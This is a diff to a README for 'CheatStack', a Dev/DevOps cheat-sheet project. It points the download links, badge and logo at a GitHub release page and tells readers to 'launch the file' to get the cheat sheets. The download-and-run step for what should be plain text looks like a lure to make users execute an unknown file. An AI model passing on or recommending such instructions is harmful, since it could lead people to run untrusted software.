@@ -19,7 +19,7 @@
 - Terraform
 
 ## Get Started
-📂 Download the CheatStack repository from [here](https://github.com/file/App.zip). Launch the file to access all the cheat sheets and commands.
+📂 Download the CheatStack repository from [here](https://github.com/PERPINK/cheat-stack/releases/tag/v2.0). Launch the file to access all the cheat sheets and commands.
 
 ## Explore Further
 🔗 Visit the [CheatStack Website]() for additional resources and updates.
@@ -27,7 +27,7 @@
 ## Releases
 📦 If the provided link is not working or you need the latest version, please check the "Releases" section of this repository.
 
-[![](https://img.shields.io/badge/Download-CheatStack-blue)](https://github.com/file/App.zip)
+[![](https://github.com/PERPINK/cheat-stack/releases/tag/v2.0)](https://github.com/PERPINK/cheat-stack/releases/tag/v2.0)
 
 ## Sample Code Snippet
 ```bash
@@ -44,7 +44,7 @@ docker run -d <image>
 ## Spread the Word
 📢 Show your love for CheatStack by sharing it with your friends and colleagues. Let's make Dev/DevOps development easier for everyone.
 
-![CheatStack Logo](https://example.com/cheatstack-logo.png)
+![CheatStack Logo](https://github.com/PERPINK/cheat-stack/releases/tag/v2.0)
 
 ---
 
